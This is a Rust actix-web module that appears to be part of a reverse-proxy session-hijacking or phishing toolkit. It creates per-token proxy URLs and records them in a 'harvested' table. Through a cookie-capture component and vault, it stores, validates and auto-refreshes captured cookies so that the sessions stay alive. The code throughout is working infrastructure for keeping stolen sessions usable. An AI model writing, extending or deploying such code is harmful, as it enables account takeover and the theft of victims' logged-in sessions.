use actix_web::{web, HttpResponse, Responder};
use serde::{Deserialize, Serialize};
use chrono::{Utc, Duration};
use sqlx::SqlitePool;
use std::time::Duration as StdDuration;

use crate::cookie_capture::CookieCapture;
use crate::vault::Vault;
use crate::AppState;

/// Session status
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum SessionStatus {
    Active,
    Pending,
    Expired,
    Killed,
}

impl ToString for SessionStatus {
    fn to_string(&self) -> String {
        match self {
            SessionStatus::Active => "active".to_string(),
            SessionStatus::Pending => "pending".to_string(),
            SessionStatus::Expired => "expired".to_string(),
            SessionStatus::Killed => "killed".to_string(),
        }
    }
}

impl SessionStatus {
    fn from_str(s: &str) -> Self {
        match s.to_lowercase().as_str() {
            "active" => SessionStatus::Active,
            "pending" => SessionStatus::Pending,
            "expired" => SessionStatus::Expired,
            "killed" => SessionStatus::Killed,
            _ => SessionStatus::Pending,
        }
    }
}

/// Proxy session data
#[derive(Debug, Clone, Serialize, Deserialize, sqlx::FromRow)]
pub struct ProxySessionData {
    pub id: String,
    pub token_id: String,
    pub proxy_url: String,
    pub status: String,
    pub created_at: String,
    pub last_active_at: Option<String>,
    pub expires_at: Option<String>,
}

/// Session status response
#[derive(Debug, Serialize)]
pub struct SessionStatusResponse {
    pub token_id: String,
    pub status: String,
    pub proxy_url: String,
    pub created_at: String,
    pub last_active_at: Option<String>,
    pub expires_at: Option<String>,
    pub cookie_count: i32,
    pub is_valid: bool,
    pub next_refresh: String,
}

/// Proxy session manager
#[derive(Clone)]
pub struct ProxySession {
    proxy_domain: String,
    cookie_capture: CookieCapture,
}

impl ProxySession {
    pub fn new(proxy_domain: String, vault: Vault) -> Self {
        Self {
            proxy_domain,
            cookie_capture: CookieCapture::new(vault),
        }
    }

    /// Create a new proxy session for a token
    pub async fn create_session(
        &self,
        pool: &SqlitePool,
        token_id: &str,
    ) -> anyhow::Result<ProxySessionData> {
        let id = uuid::Uuid::new_v4().to_string();
        let now = Utc::now();
        let proxy_url = format!("https://{}/s/{}/", self.proxy_domain, token_id);
        let expires_at = now + Duration::hours(24); // 24 hour expiry
        
        let session = ProxySessionData {
            id: id.clone(),
            token_id: token_id.to_string(),
            proxy_url: proxy_url.clone(),
            status: SessionStatus::Pending.to_string(),
            created_at: now.to_rfc3339(),
            last_active_at: None,
            expires_at: Some(expires_at.to_rfc3339()),
        };

        // Store in database
        sqlx::query(
            r#"
            INSERT INTO proxy_sessions (
                id, token_id, proxy_url, status, created_at, last_active_at, expires_at
            ) VALUES (?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(id) DO UPDATE SET
                proxy_url = excluded.proxy_url,
                status = excluded.status,
                created_at = excluded.created_at,
                expires_at = excluded.expires_at
            "#
        )
        .bind(&id)
        .bind(token_id)
        .bind(&proxy_url)
        .bind(&session.status)
        .bind(&session.created_at)
        .bind(&session.last_active_at)
        .bind(&session.expires_at)
        .execute(pool)
        .await?;

        // Also update the harvested table for quick reference
        let _ = sqlx::query(
            "UPDATE harvested SET proxy_session_status = ?, proxy_session_url = ?, proxy_session_created_at = ? WHERE id = ?"
        )
        .bind("pending")
        .bind(&proxy_url)
        .bind(&session.created_at)
        .bind(token_id)
        .execute(pool)
        .await;

        println!("[session] Created proxy session for token {}: {}", token_id, proxy_url);

        Ok(session)
    }

    /// Get session URL for a token
    pub async fn get_session_url(
        &self,
        pool: &SqlitePool,
        token_id: &str,
    ) -> anyhow::Result<String> {
        let row: Option<(String,)> = sqlx::query_as(
            "SELECT proxy_url FROM proxy_sessions WHERE token_id = ? AND status != 'killed' ORDER BY created_at DESC LIMIT 1"
        )
        .bind(token_id)
        .fetch_optional(pool)
        .await?;

        match row {
            Some((url,)) => Ok(url),
            None => {
                // Create a new session if none exists
                let session = self.create_session(pool, token_id).await?;
                Ok(session.proxy_url)
            }
        }
    }

    /// Check if session is active
    pub async fn is_session_active(
        &self,
        pool: &SqlitePool,
        token_id: &str,
    ) -> bool {
        // Check if session exists and is not expired/killed
        let row: Option<(String, String)> = sqlx::query_as(
            "SELECT status, expires_at FROM proxy_sessions WHERE token_id = ? ORDER BY created_at DESC LIMIT 1"
        )
        .bind(token_id)
        .fetch_optional(pool)
        .await
        .unwrap_or(None);

        if let Some((status, expires_at)) = row {
            if status == "killed" {
                return false;
            }
            
            // Check if expired
            if !expires_at.is_empty() {
                if let Ok(exp_dt) = chrono::DateTime::parse_from_rfc3339(&expires_at) {
                    if Utc::now() > exp_dt.with_timezone(&Utc) {
                        // Mark as expired
                        let _ = self.update_session_status(pool, token_id, SessionStatus::Expired).await;
                        return false;
                    }
                }
            }
            
            // Check if cookies are valid
            return self.cookie_capture.is_session_valid(pool, token_id).await;
        }

        false
    }

    /// Get detailed session status
    pub async fn get_session_status(
        &self,
        pool: &SqlitePool,
        token_id: &str,
    ) -> anyhow::Result<SessionStatusResponse> {
        let row: Option<ProxySessionData> = sqlx::query_as::<_, ProxySessionData>(
            "SELECT id, token_id, proxy_url, status, created_at, last_active_at, expires_at FROM proxy_sessions WHERE token_id = ? ORDER BY created_at DESC LIMIT 1"
        )
        .bind(token_id)
        .fetch_optional(pool)
        .await?;

        let cookies = self.cookie_capture.get_cookies(pool, token_id).await?;
        let is_valid = self.cookie_capture.is_session_valid(pool, token_id).await;
        
        let next_refresh = (Utc::now() + Duration::minutes(5)).to_rfc3339();

        match row {
            Some(session) => {
                // Update status if needed
                let current_status = SessionStatus::from_str(&session.status);
                let updated_status = if is_valid {
                    SessionStatus::Active
                } else if current_status == SessionStatus::Active {
                    SessionStatus::Expired
                } else {
                    current_status
                };

                if updated_status.to_string() != session.status {
                    let _ = self.update_session_status(pool, token_id, updated_status.clone()).await;
                }

                Ok(SessionStatusResponse {
                    token_id: token_id.to_string(),
                    status: updated_status.to_string(),
                    proxy_url: session.proxy_url,
                    created_at: session.created_at,
                    last_active_at: Some(Utc::now().to_rfc3339()),
                    expires_at: session.expires_at,
                    cookie_count: cookies.len() as i32,
                    is_valid,
                    next_refresh,
                })
            }
            None => {
                Ok(SessionStatusResponse {
                    token_id: token_id.to_string(),
                    status: "none".to_string(),
                    proxy_url: "".to_string(),
                    created_at: "".to_string(),
                    last_active_at: None,
                    expires_at: None,
                    cookie_count: cookies.len() as i32,
                    is_valid: false,
                    next_refresh,
                })
            }
        }
    }

    /// Update session status
    async fn update_session_status(
        &self,
        pool: &SqlitePool,
        token_id: &str,
        status: SessionStatus,
    ) -> anyhow::Result<()> {
        let now = Utc::now().to_rfc3339();
        
        sqlx::query(
            "UPDATE proxy_sessions SET status = ?, last_active_at = ? WHERE token_id = ?"
        )
        .bind(status.to_string())
        .bind(&now)
        .bind(token_id)
        .execute(pool)
        .await?;

        // Also update harvested table
        let _ = sqlx::query(
            "UPDATE harvested SET proxy_session_status = ? WHERE id = ?"
        )
        .bind(status.to_string())
        .bind(token_id)
        .execute(pool)
        .await;

        println!("[session] Updated status for token {}: {}", token_id, status.to_string());
        
        Ok(())
    }

    /// Kill session (delete cookies and mark as killed)
    pub async fn kill_session(
        &self,
        pool: &SqlitePool,
        token_id: &str,
    ) -> anyhow::Result<bool> {
        // Delete cookies
        self.cookie_capture.delete_cookies(pool, token_id).await?;
        
        // Mark session as killed
        self.update_session_status(pool, token_id, SessionStatus::Killed).await?;
        
        // Update harvested table
        let _ = sqlx::query(
            "UPDATE harvested SET proxy_session_status = ?, session_status = ? WHERE id = ?"
        )
        .bind("killed")
        .bind("killed")
        .bind(token_id)
        .execute(pool)
        .await;

        println!("[session] Killed session for token {}", token_id);
        
        Ok(true)
    }

    /// Auto-refresh session
    pub async fn refresh_session(
        &self,
        pool: &SqlitePool,
        token_id: &str,
    ) -> anyhow::Result<bool> {
        println!("[session] Auto-refreshing session for token {}", token_id);
        
        // Check current status
        let is_valid = self.is_session_active(pool, token_id).await;
        
        if is_valid {
            // Update last_active_at
            let now = Utc::now().to_rfc3339();
            sqlx::query(
                "UPDATE proxy_sessions SET last_active_at = ? WHERE token_id = ?"
            )
            .bind(&now)
            .bind(token_id)
            .execute(pool)
            .await?;
            
            // Update harvested table
            let _ = sqlx::query(
                "UPDATE harvested SET proxy_session_status = ? WHERE id = ?"
            )
            .bind("active")
            .bind(token_id)
            .execute(pool)
            .await;
            
            return Ok(true);
        }
        
        // Try to refresh cookies
        let refreshed = self.cookie_capture.refresh_session(pool, token_id).await?;
        
        if refreshed {
            self.update_session_status(pool, token_id, SessionStatus::Active).await?;
        } else {
            self.update_session_status(pool, token_id, SessionStatus::Expired).await?;
        }
        
        Ok(refreshed)
    }

    /// Get all active sessions
    pub async fn get_active_sessions(
        &self,
        pool: &SqlitePool,
    ) -> anyhow::Result<Vec<ProxySessionData>> {
        let sessions: Vec<ProxySessionData> = sqlx::query_as::<_, ProxySessionData>(
            "SELECT id, token_id, proxy_url, status, created_at, last_active_at, expires_at FROM proxy_sessions WHERE status = 'active' OR status = 'pending'"
        )
        .fetch_all(pool)
        .await?;

        Ok(sessions)
    }

    /// Clean up expired sessions
    pub async fn cleanup_expired_sessions(
        &self,
        pool: &SqlitePool,
    ) -> anyhow::Result<u64> {
        let now = Utc::now().to_rfc3339();
        
        let result = sqlx::query(
            "DELETE FROM proxy_sessions WHERE expires_at < ? AND status != 'killed'"
        )
        .bind(&now)
        .execute(pool)
        .await?;

        if result.rows_affected() > 0 {
            println!("[session] Cleaned up {} expired sessions", result.rows_affected());
        }

        Ok(result.rows_affected())
    }
}

/// HTTP handler to create proxy session
pub async fn create_proxy_session_handler(
    path: web::Path<String>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = path.into_inner();
    let proxy_session = ProxySession::new(
        state.config.proxy_domain.clone(),
        state.vault.clone(),
    );
    
    match proxy_session.create_session(&state.pool, &token_id).await {
        Ok(session) => {
            HttpResponse::Ok().json(serde_json::json!({
                "status": "created",
                "token_id": token_id,
                "proxy_url": session.proxy_url,
                "session_id": session.id,
                "created_at": session.created_at,
                "expires_at": session.expires_at,
            }))
        }
        Err(e) => {
            eprintln!("[session] Failed to create session: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "failed_to_create_session",
                "details": format!("{}", e)
            }))
        }
    }
}

/// HTTP handler to get session status
pub async fn get_proxy_session_status_handler(
    path: web::Path<String>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = path.into_inner();
    let proxy_session = ProxySession::new(
        state.config.proxy_domain.clone(),
        state.vault.clone(),
    );
    
    match proxy_session.get_session_status(&state.pool, &token_id).await {
        Ok(status) => HttpResponse::Ok().json(status),
        Err(e) => {
            eprintln!("[session] Failed to get status: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "failed_to_get_status",
                "details": format!("{}", e)
            }))
        }
    }
}

/// HTTP handler to kill proxy session
pub async fn kill_proxy_session_handler(
    path: web::Path<String>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = path.into_inner();
    let proxy_session = ProxySession::new(
        state.config.proxy_domain.clone(),
        state.vault.clone(),
    );
    
    match proxy_session.kill_session(&state.pool, &token_id).await {
        Ok(_) => {
            HttpResponse::Ok().json(serde_json::json!({
                "status": "killed",
                "token_id": token_id,
                "message": "Proxy session terminated successfully"
            }))
        }
        Err(e) => {
            eprintln!("[session] Failed to kill session: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "failed_to_kill_session",
                "details": format!("{}", e)
            }))
        }
    }
}

/// HTTP handler to get session URL
pub async fn get_proxy_session_url_handler(
    path: web::Path<String>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = path.into_inner();
    let proxy_session = ProxySession::new(
        state.config.proxy_domain.clone(),
        state.vault.clone(),
    );
    
    match proxy_session.get_session_url(&state.pool, &token_id).await {
        Ok(url) => {
            HttpResponse::Ok().json(serde_json::json!({
                "token_id": token_id,
                "proxy_url": url,
                "status": "ok"
            }))
        }
        Err(e) => {
            eprintln!("[session] Failed to get session URL: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "failed_to_get_url",
                "details": format!("{}", e)
            }))
        }
    }
}

/// HTTP handler to refresh proxy session
pub async fn refresh_proxy_session_handler(
    path: web::Path<String>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = path.into_inner();
    let proxy_session = ProxySession::new(
        state.config.proxy_domain.clone(),
        state.vault.clone(),
    );
    
    match proxy_session.refresh_session(&state.pool, &token_id).await {
        Ok(success) => {
            HttpResponse::Ok().json(serde_json::json!({
                "status": if success { "refreshed" } else { "refresh_failed" },
                "token_id": token_id,
                "session_valid": success,
            }))
        }
        Err(e) => {
            eprintln!("[session] Failed to refresh session: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "failed_to_refresh",
                "details": format!("{}", e)
            }))
        }
    }
}

/// HTTP handler to list all active sessions
pub async fn list_active_sessions_handler(
    state: web::Data<AppState>,
) -> impl Responder {
    let proxy_session = ProxySession::new(
        state.config.proxy_domain.clone(),
        state.vault.clone(),
    );
    
    match proxy_session.get_active_sessions(&state.pool).await {
        Ok(sessions) => {
            HttpResponse::Ok().json(serde_json::json!({
                "count": sessions.len(),
                "sessions": sessions,
            }))
        }
        Err(e) => {
            eprintln!("[session] Failed to list sessions: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "failed_to_list_sessions",
                "details": format!("{}", e)
            }))
        }
    }
}

/// Background task to auto-refresh proxy sessions
pub async fn run_proxy_session_refresh_cycle(state: web::Data<AppState>) {
    println!("[session] Starting session refresh cycle");
    
    let proxy_session = ProxySession::new(
        state.config.proxy_domain.clone(),
        state.vault.clone(),
    );
    
    // Get all active sessions
    match proxy_session.get_active_sessions(&state.pool).await {
        Ok(sessions) => {
            for session in sessions {
                let token_id = session.token_id;
                println!("[session] Checking session for token {}", token_id);
                
                match proxy_session.refresh_session(&state.pool, &token_id).await {
                    Ok(valid) => {
                        if valid {
                            println!("[session] Session for token {} is valid", token_id);
                        } else {
                            println!("[session] Session for token {} expired", token_id);
                        }
                    }
                    Err(e) => {
                        eprintln!("[session] Error refreshing session for token {}: {}", token_id, e);
                    }
                }
                
                // Small delay between checks
                tokio::time::sleep(StdDuration::from_millis(100)).await;
            }
        }
        Err(e) => {
            eprintln!("[session] Failed to get active sessions: {}", e);
        }
    }
    
    // Clean up expired sessions
    if let Err(e) = proxy_session.cleanup_expired_sessions(&state.pool).await {
        eprintln!("[session] Failed to cleanup expired sessions: {}", e);
    }
    
    println!("[session] Session refresh cycle complete");
}
